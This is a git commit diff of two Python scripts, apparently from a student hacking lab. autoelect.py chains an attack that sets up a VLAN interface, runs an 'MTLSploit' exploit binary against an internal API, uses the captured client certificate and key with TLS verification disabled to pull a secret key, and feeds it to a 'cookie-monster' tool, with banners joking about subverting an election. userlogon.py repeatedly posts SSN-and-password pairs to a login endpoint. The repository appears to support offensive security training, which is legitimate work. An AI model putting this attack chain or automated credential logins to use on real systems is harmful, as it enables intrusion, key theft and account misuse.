74aeb0089ee308b408dcb36e876016eaacebee6f
cannotilever <cannotilever@protonmail.com>
2022-11-08 22:10:59 -0500

    fixed autoelect and made it prettier

--- autoelect.py
+++ autoelect.py
@@ -1,25 +1,30 @@
 #!/usr/bin/python3
-import subprocess
 import os
 import requests
-print("Welcome to Auto Elect!".center(70,"="))
-print("Is democracy too inconvenient? We've got you covered.\nRemember to run as root!\n")
-print("Registering interface on secure vlan...")
+os.system("clear")
+print("".center(80,"="))
+print("Welcome to Auto Elect!".center(80,"-"))
+print("Is democracy too inconvenient? We've got you covered.")
+print("".center(80,"="))
+print("\n\n")
+print("Registering interface on secure vlan...".center(80,"-"))
 status = 0
 status |= os.system("sudo ip link add link ens3 name ens3.10 type vlan id 10")
 status |= os.system("sudo ip addr  add dev ens3.10 172.16.10.200/24")
 status |= os.system("sudo ip link set dev ens3.10 up")
 if status:
-    raise ChildProcessError("Could not register address on secure vlan. Abort!")
-print("Registered.\nLaunching MTLS Exploiter...\n")
-status |= os.system("sudo ./exploit -d api.internal")
+    print("WARNING: ip address registration failed, this might not work...")
+print("Registered.\n")
+print("Launching MTLSploit".center(80,"-"))
+status = os.system("sudo ./exploit -d api.internal")
 if status:
     raise ChildProcessError("Exploit binary failed!")
 try:
-    key = requests.get("https://keyserver.internal", cert=("api.internal-crt.pem","api.internal-key.pem")).text
-except(SSLError):
-    raise FileNotFoundError("API certificate and key do not exist in this dir, did exploit fail?")
+    key = requests.get("https://keyserver.internal", cert=("/home/student/hack/api.internal-crt.pem","/home/student/hack/api.internal-key.pem"),verify=False).text
+except(requests.exceptions.SSLError):
+    raise FileNotFoundError("Certificate Verification Failed! Abort!")
 print("I found the API's secret key! It's ",key)
-print("Launching final attack phase...")
+print("\n\n")
+print("Launching Cookie Monster".center(80,"-"))
 os.system("./cookie-monster {}".format(key))
-print("Thank you for choosing us to subvert your election <3")
+print("\n\nThank you for choosing us to subvert your election <3")
--- userlogon.py
+++ userlogon.py
@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 import requests
 import time
 import random
@@ -6,6 +7,6 @@ users = usersf.splitlines()
 while True:
     user,passwd = random.choice(users).split(":")
     postdata = {"ssn":user,"password":passwd}
-    print("logging in as {} with password {}".format(user,passwd))
-    requests.post("https://api.internal/login", data=postdata)
+    print("logging in with SSN {} and password {}".format(user,passwd))
+    requests.post("https://api.internal/login", data=postdata, verify=False)
     time.sleep(random.randrange(2,14))
